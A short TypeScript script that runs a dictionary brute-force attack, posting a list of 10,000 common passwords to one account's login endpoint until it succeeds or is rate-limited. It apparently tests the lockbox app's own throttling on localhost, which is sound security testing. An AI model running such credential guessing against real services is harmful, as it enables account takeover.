// Brute force: fire the common-password list at one account's login until it opens.
// Run: npx tsx attacks/brute.ts ravi@lockbox.app
import { readFileSync } from "node:fs";
const BASE = process.env.BASE ?? "http://localhost:8787";
const email = process.argv[2] ?? "ravi@lockbox.app";
const words = readFileSync("10k-most-common.txt", "utf8").split("\n").map(w => w.trim()).filter(Boolean);

let n = 0;
for (const password of words) {
  n++;
  const r = await fetch(`${BASE}/api/login`, {
    method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ email, password }),
  });
  if (r.status === 429) { console.log(`blocked after ${n} tries (429 too many attempts)`); break; }
  if (r.ok) { console.log(`IN after ${n} tries: ${email} / ${password}`); break; }
  if (n % 20 === 0) process.stdout.write(`...${n} tries\r`);
}
